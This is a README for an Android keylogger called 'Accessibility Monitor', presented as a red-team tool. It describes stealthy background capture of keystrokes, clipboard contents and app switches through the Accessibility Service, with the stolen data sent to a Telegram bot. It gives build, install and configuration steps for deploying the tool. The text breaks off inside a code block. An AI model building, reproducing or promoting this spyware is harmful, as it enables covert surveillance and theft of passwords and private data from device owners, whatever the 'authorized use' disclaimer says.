# Accessibility Monitor

**Professional Android Accessibility Service Keylogger Tool**  
For Authorized Security Testing & Red Team Operations

A powerful, stealthy Android monitoring tool built with Kotlin that leverages the Accessibility Service API to capture user interactions, keystrokes, clipboard content, and application switches in real-time. Data is exfiltrated securely to a Telegram bot.

**⚠️ Authorized Use Only**

---

## Features
- Real-time Keylogging via Accessibility Events
- Clipboard Monitoring
- App Switch Tracking
- Telegram Exfiltration (chunked & reliable)
- Stealth background operation
- Production-ready release build

## Setup & Build
1. Extract ZIP
2. Run `./gradlew assembleRelease`
3. Install `app-release.apk`
4. Configure Bot Token + Chat ID
5. Enable in Accessibility Settings

## Project Structure, Usage, Legal, etc. (fully documented)

### how to use
```bash
Download and extract AccessibilityMonitor.zip
Edit app/src/main/java/com/pentest/keyloggertool/MainActivity.kt → replace YOUR_BOT_TOKEN_HERE and YOUR_CHAT_ID_HERE
